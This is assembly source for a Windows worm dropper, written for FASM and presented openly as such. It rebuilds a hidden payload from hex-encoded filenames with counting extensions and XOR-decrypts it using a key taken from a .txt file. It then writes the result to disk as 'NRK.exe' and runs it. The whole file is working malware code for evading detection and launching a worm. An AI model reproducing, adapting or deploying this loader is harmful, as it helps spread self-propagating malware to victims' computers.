include '..\FASM\INCLUDE\win32ax.inc'

.data

	memory_alloc	dd 0x0
	memory_counter	dd 0x0

	searchstr_fn	db '*.'
	      fn_ext	db '000', 0x0

	stSearchTxt	db '*.txt', 0x0

	hSearchFile	dd 0x0
	dot_position	dd 0x0
	trash		dd 0x0
	trash2		dd 0x0

	hCreFile	dd 0x0
	key_txt_size	dd 0x0
	hCrFiMap	dd 0x0
	hMapView	dd 0x0

	FALSE_F 	dd 0x0

	hWormFile	dd 0x0
	worm_file	db 'NRK.exe',0x0

WIN32_FIND_DATA:
  .dwFileAttributes   dd ?
  .ftCreationTime     FILETIME
  .ftLastAccessTime   FILETIME
  .ftLastWriteTime    FILETIME
  .nFileSizeHigh      dd ?
  .nFileSizeLow       dd ?
  .dwReserved0	      dd ?
  .dwReserved1	      dd ?
  .cFileName	      rb 260
  .cAlternateFileName rb 14
;end WIN32_FIND_DATA


STARTUP_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0


PROCESS_INFO_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0
.code
start:
	invoke	VirtualAlloc, \
		0x0, \
		0x10000, \		; 64 KB RAM
		0x1000, \
		0x4
	mov	[memory_alloc], eax

   find_files_with_sp_name:
	invoke	FindFirstFile, \	       ; Find a file with special filenames
		searchstr_fn, \ 	       ; Pointer to filename (*.NNN - where NNN is the counter)
		WIN32_FIND_DATA 	       ; Pointer to WIN32_FIND_DATA structure
	mov	[hSearchFile], eax	       ; Save search handle

	cmp	eax, INVALID_HANDLE_VALUE      ; Last File?
	je	decrypt_worm_code	       ; If yes, let's decrypt the worm-code

	call	change_search_str	       ; Increase the extention (counter)
	xor	ecx, ecx		       ; Counter=0
	call	FileName_To_Memory	       ; Write the filename to memory

	invoke	FindClose, \		       ; Close search-handle
		[hSearchFile]
   jmp	find_files_with_sp_name

	nop				       ; Due to a bug in CMD.EXE I have to change the offset
					       ; of the decrypt_worm_code lable.
decrypt_worm_code:

	xor	ecx, ecx
   hex2bin_loop:
	mov	eax, [memory_alloc]
	add	eax, ecx
	mov	ax, word [eax]
	call	hex_to_binary
	mov	ebx, ecx
	shr	ebx, 1
	add	ebx, [memory_alloc]
	mov	[ebx], al
	add	ecx, 2
	cmp	ecx, [memory_counter]
   js	hex2bin_loop

	invoke	FindFirstFile, \	       ; Find the *.txt file with the key to decrypt
		stSearchTxt, \
		WIN32_FIND_DATA

	invoke	FindClose, \		       ; Close the Search-Handle
		eax

	invoke	CreateFile, \		       ; Open the .txt file (with the decrytion-key)
		WIN32_FIND_DATA.cFileName, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCreFile], eax

	invoke	GetFileSize, \			; Get the Filesize of the file
		[hCreFile], \			; =Size of the key
		key_txt_size
	mov	[key_txt_size], eax


	invoke	CreateFileMapping, \		; Create a Map of the File
		[hCreFile], \
		0x0, \
		PAGE_READWRITE, \
		0x0, \
		[key_txt_size], \
		0x0
	mov	[hCrFiMap], eax

	invoke	MapViewOfFile, \		; Create a MapViewOfFile
		[hCrFiMap], \			; The key with the decrytion key
		FILE_MAP_ALL_ACCESS, \
		0x0, \
		0x0, \
		[key_txt_size]
	mov	[hMapView], eax

	xor	ecx, ecx			; ECX=COUNTER=0x0
    decrypt_memory_code:
	mov	eax, [hMapView] 		; EAX=Start of decrytion-key
	add	eax, ecx			; EAX=Current position of decrytion key
	mov	al, byte [eax]			; al=Content of current position of decrytion key
	mov	ebx, [memory_alloc]		; EBX=Start of encryted virus in memory
	add	ebx, ecx			; EBX=Current position of encryted virus
	mov	ah, byte [ebx]			; ah=Content of current position of encryted virus
	xor	ah, al				; AH=Encrypted Byte XOR KEY
	mov	byte [ebx], ah			; Write AH to Memory
	inc	ecx				; Increase the counter
	mov	eax, [memory_counter]		; Size of the virus*2 (Due to Hex (2Byte) -> Bin (1Byte) conversion)
	shr	eax, 1				; EAX/2
	cmp	ecx, [key_txt_size]		; Compare if current position greater than key
	jg	finish_decrytion		; If yes, finish decrytion
	cmp	ecx, eax			; Compare if current byte smaller than virus size
    js	decrypt_memory_code			; If yes, continue

   finish_decrytion:

	invoke	UnmapViewOfFile, \
		[hMapView]

	invoke	CloseHandle, \
		[hCrFiMap]

	invoke	CloseHandle, \
		[hCreFile]



	invoke	CreateFile, \
		worm_file, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hWormFile], eax

	mov	eax, [memory_counter]
	shr	eax, 1


	invoke	WriteFile, \			; Write the real worm-file
		[hWormFile], \
		[memory_alloc], \
		eax, \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \			; Close Wormfile
		[hWormFile]

	invoke	CreateProcess, \		; Open Worm!
		worm_file, \
		0x0, \
		0x0, \
		0x0, \
		FALSE, \
		0x0, \
		0x0, \
		0x0, \
		STARTUP_struct, \
		PROCESS_INFO_struct


endde:
	invoke	ExitProcess, 0x0



change_search_str:			; Changes the extention to search for
	mov	eax, fn_ext+2		; Pointer to 3rd byte in extention
	cmp	byte [eax], '9' 	; Is it '9'?
	je	hex_ext_counter_9_A	; If yes, make a 'A'

	cmp	byte [eax], 'Z' 	; Is it 'Z'?
	je	hex_ext_counter_Z_0

	inc	byte [eax]		; Increase extention-counter
ret


hex_ext_counter_9_A:
; In:  eax = Pointer to byte to change
; Out: [eax]='A'

	mov	byte [eax], 'A' 	; Increase extention-counter
ret



hex_ext_counter_Z_0:			; My first recursive function in asm :)
	mov	byte [eax], '0' 	; Increase extention-counter
	dec	eax
	cmp	byte [eax], '9'
	je	hex_ext_counter_9_A

	cmp	byte [eax], 'Z'
	je	hex_ext_counter_Z_0

	inc	byte [eax]
ret

FileName_To_Memory:
	mov	ecx, 0x9
   get_dot_in_filename:
	mov	eax, WIN32_FIND_DATA.cFileName
	add	eax, ecx
	cmp	byte [eax], '.'
	je found_dot_in_filename
   loop get_dot_in_filename
found_dot_in_filename:
	mov	[dot_position], ecx

	mov	esi, WIN32_FIND_DATA.cFileName		; What? Filename!
	mov	edi, [memory_alloc]			; Where? Memory!
	add	edi, [memory_counter]			; Where exactly? Next byte in memory
	rep	movsb					; Write!

	mov	ecx, [dot_position]
	add	[memory_counter], ecx

	mov	dword [WIN32_FIND_DATA.cFileName], 0x0		; Anything to 0x0 because if the filename is small,
	mov	dword [WIN32_FIND_DATA.cFileName+4], 0x0	; the dot of the last filename still exists.
	mov	dword [WIN32_FIND_DATA.cFileName+8], 0x0	; (that damn bug wasted ~1h of my time :D)
								; Example: "AA00BB00.001"+0x0
								;          "A.002"+0x0
								;    data: "A.002"+0x0+"00.001"

ret


hex_to_binary:
; Change a HEX-value to binary
; In:  AX = HEX-value (i.E.: "0D")
; Out: AL = binary (i.E.: 0x0D)
; Nothing else changed

	mov	[trash], ebx		; Save ebx
	xchg	al, ah
	sub	ax, 0x3030		; "11"=0x3131 - make it to 0x0101
	push	hex2bin_not_A_F_1

	cmp	al, 0x9 		; If al>0x9 then decrease by 7
	jg	hex2bin_dec_al

	pop	ebx
hex2bin_not_A_F_1:

	mov	ebx, eax		; Save eax
	mov	al, ah			; AL=AH
	push	hex2bin_not_A_F_2
	cmp	al, 0x9 		; If al>0x9 then decrease by 7
	jg	hex2bin_dec_al

	mov	[trash2], ebx
	pop	ebx
	mov	ebx, [trash2]
hex2bin_not_A_F_2:
	xchg	ah, al
	shl	ah, 4

	mov	al, bl
	or	al, ah

	mov	ebx, [trash]		; Restore ebx
ret

hex2bin_dec_al:
	sub	al, 7
ret
.end start